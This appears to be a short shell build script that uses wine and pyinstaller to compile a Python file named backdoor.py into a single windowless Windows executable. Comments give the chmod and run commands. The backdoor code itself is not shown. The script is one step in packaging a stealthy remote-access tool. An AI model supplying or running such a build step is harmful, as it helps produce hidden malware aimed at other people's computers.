#!/bin/sh
# chmod 755 build_backdoor.sh
# ./build_backdoor.sh
wine pyinstaller --onefile --noconsole backdoor.py
